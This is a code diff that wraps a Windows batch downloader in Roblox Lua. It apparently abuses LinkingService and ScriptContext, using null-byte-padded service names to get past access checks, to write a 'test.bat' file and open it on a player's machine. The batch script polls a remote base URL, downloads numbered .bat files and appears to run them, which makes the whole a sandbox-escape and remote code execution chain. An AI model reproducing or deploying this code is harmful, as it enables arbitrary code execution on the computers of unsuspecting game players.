@@ -1,3 +1,6 @@
+local LinkingService = game:GetService("LinkingService\0 meow meow meow")
+local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
+local scriptContent = [[@echo off
 @echo off
 setlocal enabledelayedexpansion
 
@@ -10,7 +13,7 @@ set "checkInterval=30" :: Интервал перезапуска в секун�
 :: Параметры по умолчанию
 set "startIndex=100"
 set "minIndex=0"
-set "waitTime=10"
+set "waitTime=0"
 
 :: Создаем папку для скриптов, если она не существует
 if not exist "%scriptFolder%" (
@@ -37,26 +40,27 @@ set "currentIndex=%startIndex%"
 :CheckScript
 set "url=%baseUrl%!currentIndex!"
 echo [INFO] Checking file: !url!
-:: Проверка ответа на код состояния HTTP
 curl -s --head "!url!" | find "200 OK" >nul
 if !errorlevel! equ 0 (
     echo [INFO] Found valid script: !currentIndex!
     goto :ProcessScripts
 ) else (
     set /a currentIndex-=1
-    if !currentIndex! geq %minIndex% goto :CheckScript
+    if !currentIndex! geq %minIndex% (
+        timeout /t %waitTime% >nul
+        goto :CheckScript
+    )
     echo [WARN] No valid scripts found. Retrying in %waitTime% seconds.
     timeout /t %waitTime% >nul
     goto :FindValidScript
 )
-
 
 :: Обработка скриптов начиная с найденного
 :ProcessScripts
 :CheckNextScript
 set "url=%baseUrl%!currentIndex!"
 echo [INFO] Checking for next script: !url!
-curl -s --head "!url!" | find "200" >nul
+curl -s --head "!url!" | find "200 OK" >nul
 if !errorlevel! equ 0 (
     echo [INFO] Found next script: !currentIndex!
     curl -s "!url!" -o "%scriptFolder%\CustomScriptHolder!currentIndex!.bat"
@@ -82,3 +86,7 @@ timeout /t %checkInterval% >nul
 exit
 
 endlocal
+
+]]
+local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
+LinkingService:OpenUrl(payload)
